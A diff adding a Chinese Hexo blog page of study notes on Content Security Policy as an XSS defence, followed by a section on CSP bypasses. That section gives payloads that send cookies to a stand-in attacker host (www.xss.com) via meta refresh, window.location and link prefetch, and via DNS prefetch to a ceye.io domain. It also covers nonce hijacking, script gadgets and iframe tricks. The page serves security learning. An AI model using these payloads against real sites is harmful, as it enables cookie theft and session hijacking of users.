@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>XSS防御之CSP原理学习 | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    XSS防御之CSP原理学习
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS防御之CSP原理学习"><span class="toc-number">1.</span> <span class="toc-text">XSS防御之CSP原理学习</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#（1）使用HTTP的-Content-Security-Policy头部"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">（1）使用HTTP的 Content-Security-Policy头部</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#（2）启用违例报告"><span class="toc-number">1.0.0.0.2.</span> <span class="toc-text">（2）启用违例报告</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#（3）使用meta标签"><span class="toc-number">1.0.0.0.3.</span> <span class="toc-text">（3）使用meta标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP策略"><span class="toc-number">1.0.1.</span> <span class="toc-text">CSP策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一、常用的策略指令："><span class="toc-number">1.0.1.1.</span> <span class="toc-text">一、常用的策略指令：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#default-src"><span class="toc-number">1.0.1.1.1.</span> <span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#script-src"><span class="toc-number">1.0.1.1.2.</span> <span class="toc-text">script-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#style-src"><span class="toc-number">1.0.1.1.3.</span> <span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#img-src"><span class="toc-number">1.0.1.1.4.</span> <span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#font-src"><span class="toc-number">1.0.1.1.5.</span> <span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#connect-src"><span class="toc-number">1.0.1.1.6.</span> <span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#child-src"><span class="toc-number">1.0.1.1.7.</span> <span class="toc-text">child-src</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二、内容源："><span class="toc-number">1.0.1.2.</span> <span class="toc-text">二、内容源：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#源列表："><span class="toc-number">1.0.1.2.1.</span> <span class="toc-text">源列表：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#关键字："><span class="toc-number">1.0.1.2.2.</span> <span class="toc-text">关键字：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="XSS防御之CSP原理学习"><a href="#XSS防御之CSP原理学习" class="headerlink" title="XSS防御之CSP原理学习"></a>XSS防御之CSP原理学习</h1><p>讲得很详细：<a href="https://yq.aliyun.com/articles/87712?utm_campaign=wenzhang&amp;utm_medium=article&amp;utm_source=QQ-qun&amp;201767&amp;utm_content=m_22674" target="_blank" rel="noopener">https://yq.aliyun.com/articles/87712?utm_campaign=wenzhang&amp;utm_medium=article&amp;utm_source=QQ-qun&amp;201767&amp;utm_content=m_22674</a></p>
+<blockquote>
+<p>内容安全策略（CSP），其核心思想十分简单：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。其被誉为专门为解决XSS攻击而生的神器。</p>
+<p>CSP（Content Security Policy）指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。简单来说，就是我们能够规定，我们的网站只接受我们指定的请求资源。</p>
+<p>CSP 本质上是建立白名单，规定了浏览器只能够执行特定来源的代码；即使发生了xss攻击，也不会加载来源不明的第三方脚本。</p>
+<p>两种方法可以启用 CSP：</p>
+<ul>
+<li>设置 HTTP 的 <code>Content-Security-Policy</code> 头部字段</li>
+<li>设置网页的<meta>标签。</li>
+</ul>
+<h5 id="（1）使用HTTP的-Content-Security-Policy头部"><a href="#（1）使用HTTP的-Content-Security-Policy头部" class="headerlink" title="（1）使用HTTP的 Content-Security-Policy头部"></a>（1）使用HTTP的 <code>Content-Security-Policy</code>头部</h5><p>在服务器端使用 HTTP的 <code>Content-Security-Policy</code>头部来指定你的策略，像这样:</p>
+<pre><code class="undefined">Content-Security-Policy: policy</code></pre>
+<p>policy参数是一个包含了各种描述CSP策略指令的字符串。</p>
+<p>1、只能在指定的域下加载文件，这里表示只能从同域下加载，斜杠为转义符：</p>
+<pre><code>&#39;Content-Security-Policy&#39;: &#39;default-src \&#39;self\&#39;&#39;</code></pre><p>如果要允许请求到这个域，添加进策略即可：</p>
+<pre><code class="rust">&#39;Content-Security-Policy&#39;: &#39;default-src \&#39;self\&#39; https://cdn.bootcss.com/&#39; </code></pre>
+<p>2、上面的策略是无法限制form表单的提交的，这时候就要设置<code>form-action</code>策略：</p>
+<pre><code>&#39;Content-Security-Policy&#39;: &#39;default-src \&#39;self\&#39; https://cdn.bootcss.com/; form-action \&#39;self\&#39;&#39;</code></pre><h5 id="（2）启用违例报告"><a href="#（2）启用违例报告" class="headerlink" title="（2）启用违例报告"></a>（2）启用违例报告</h5><p>默认情况下，违规报告并不会发送。为启用发送违规报告，你需要指定 <code>report-uri</code>策略指令，并提供至少一个URI地址去递交报告：</p>
+<pre><code class="bash">&#39;Content-Security-Policy&#39;: &#39;script-src \&#39;self\&#39;; report-uri /report&#39;</code></pre>
+<p>如果我只想收集报告，但是不真正的去限制请求，那怎么办？除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。将头部改为这个即可。</p>
+<h5 id="（3）使用meta标签"><a href="#（3）使用meta标签" class="headerlink" title="（3）使用meta标签"></a>（3）使用meta标签</h5><p>以上规则可以在浏览器端设置，如：</p>
+<pre><code class="xml">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;form-action &#39;self&#39;;&quot;&gt;</code></pre>
+<p>原文链接：<a href="https://www.jianshu.com/p/74ea9f0860d2" target="_blank" rel="noopener">https://www.jianshu.com/p/74ea9f0860d2</a></p>
+</blockquote>
+<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：</p>
+<pre><code class="csharp">Content-Security-Policy: default-src &#39;self&#39; www.baidu.com; script-src &#39;unsafe-inline&#39;</code></pre>
+<p>其中每一组策略包含一个<strong>策略指令</strong>和一个<strong>内容源</strong>列表</p>
+<h4 id="一、常用的策略指令："><a href="#一、常用的策略指令：" class="headerlink" title="一、常用的策略指令："></a>一、常用的策略指令：</h4><ul>
+<li><h5 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h5></li>
+</ul>
+<p>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：</p>
+<ul>
+<li><p>child-src</p>
+</li>
+<li><p>connect-src</p>
+</li>
+<li><p>font-src</p>
+</li>
+<li><p>img-src</p>
+</li>
+<li><p>media-src</p>
+</li>
+<li><p>object-src</p>
+</li>
+<li><p>script-src</p>
+</li>
+<li><p>style-src</p>
+</li>
+<li><h5 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h5></li>
+</ul>
+<p>script-src定义了页面中Javascript的有效来源</p>
+<ul>
+<li><h5 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h5></li>
+</ul>
+<p>style-src定义了页面中CSS样式的有效来源</p>
+<ul>
+<li><h5 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h5></li>
+</ul>
+<p>img-src定义了页面中图片和图标的有效来源</p>
+<ul>
+<li><h5 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h5></li>
+</ul>
+<p>font-src定义了字体加载的有效来源</p>
+<ul>
+<li><h5 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h5></li>
+</ul>
+<p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p>
+<ul>
+<li><h5 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h5></li>
+</ul>
+<p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如<frame>和<iframe>）的源。</iframe></p>
+<h4 id="二、内容源："><a href="#二、内容源：" class="headerlink" title="二、内容源："></a>二、内容源：</h4><p>内容源有三种：源列表、关键字和数据</p>
+<h5 id="源列表："><a href="#源列表：" class="headerlink" title="源列表："></a>源列表：</h5><p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘<em>‘)，端口号也可以使用通配符 (同样是 ‘</em>‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。<br>有效的主机表达式包括：<br>http://*<a href="http://.foo.com" target="_blank" rel="noopener">.foo.com</a> （匹配所有使用 http协议加载 <a href="http://foo.com" target="_blank" rel="noopener">foo.com</a> 任何子域名的尝试。）<br>mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）<br><a href="https://store.foo.com" target="_blank" rel="noopener">https://store.foo.com</a> （匹配所有使用 https协议访问 <a href="http://store.foo.com" target="_blank" rel="noopener">store.foo.com</a> 的尝试。）<br>如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p>
+<h5 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h5><p>1、<strong>‘none’</strong><br>代表空集；即不匹配任何 URL。两侧单引号是必须的。</p>
+<p>2、<strong>‘self’</strong><br>代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</p>
+<p>3、<strong>‘unsafe-inline’</strong><br>允许使用内联资源，如内联的<script>元素、javascript: URL、内联的事件处理函数和内联的<style>元素，两侧单引号是必须的。</p>
+<p>4、<strong>'unsafe-eval'</strong><br>允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</p>
+<pre><code class="csharp">Content-Security-Policy: default-src &#39;self&#39; trustedscripts.foo.com</code></pre>
+<h5 id="数据："><a href="#数据：" class="headerlink" title="数据："></a>数据：</h5><p>1、<strong>data:</strong><br>允许data: URI作为内容来源。</p>
+<p>2、<strong>mediastream:</strong><br>允许mediastream: URI作为内容来源。</p>
+<pre><code class="kotlin">Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></pre>
+<h2 id="CSP绕过方式"><a href="#CSP绕过方式" class="headerlink" title="CSP绕过方式"></a>CSP绕过方式</h2><p>CSP的设置可能情况太多，这里只讨论几个比较典型的情况。</p>
+<h4 id="一、url跳转"><a href="#一、url跳转" class="headerlink" title="一、url跳转"></a>一、url跳转</h4><p>在default-src 'none'的情况下，可以使用meta标签实现跳转</p>
+<pre><code class="xml">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</code></pre>
+<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
+<pre><code class="html">&lt;script&gt;
+  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;
+&lt;/script&gt;</code></pre>
+<h4 id="二、link标签预加载"><a href="#二、link标签预加载" class="headerlink" title="二、link标签预加载"></a>二、link标签预加载</h4><p>CSP对link标签的预加载功能考虑不完善。<br>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）</p>
+<pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</code></pre>
+<p>在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p>
+<pre><code class="html">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;</code></pre>
+<h4 id="三、利用浏览器补全"><a href="#三、利用浏览器补全" class="headerlink" title="三、利用浏览器补全"></a>三、利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
+<pre><code class="html">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</code></pre>
+<p>那么当脚本插入点为如下的情况时</p>
+<pre><code class="html">&lt;p&gt;插入点&lt;/p&gt;
+&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;</code></pre>
+<p>可以插入</p>
+<pre><code class="html">&lt;script src=//14.rs a=&quot;</code></pre>
+<p>这样会拼成一个新的script标签，其中的src可以自由设定</p>
+<pre><code class="html">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;
+&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;</code></pre>
+<h4 id="四、代码重用"><a href="#四、代码重用" class="headerlink" title="四、代码重用"></a>四、代码重用</h4><p>总结了可以被用来绕过CSP的一些JS库:<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a>。<br>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含"script-src 'unsafe-eval'"或者"script-src 'strict-dynamic'"，那么下面的向量就可以绕过CSP：</p>
+<pre><code class="html">&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre>
+<p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p>
+<pre><code class="html">&lt;amp-pixel src=&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt;  </code></pre>
+<h4 id="五、iframe"><a href="#五、iframe" class="headerlink" title="五、iframe"></a>五、iframe</h4><p>1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p>
+<pre><code class="html">&lt;iframe src=&quot;B&quot;&gt;&lt;/iframe&gt;</code></pre>
+<p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如"<a href="http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。" target="_blank" rel="noopener">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p>
+<pre><code class="html">&lt;iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="六、meta标签"><a href="#六、meta标签" class="headerlink" title="六、meta标签"></a>六、meta标签</h4><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</p>
+<pre><code class="html">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</code></pre>
+<p>meta可以设置Cookie（Firefox下），可以结合self-xss利用。</p>
+<pre><code class="html">&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; p</code></pre>
+<p>原文链接：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p>
+</script></p>  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-24</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
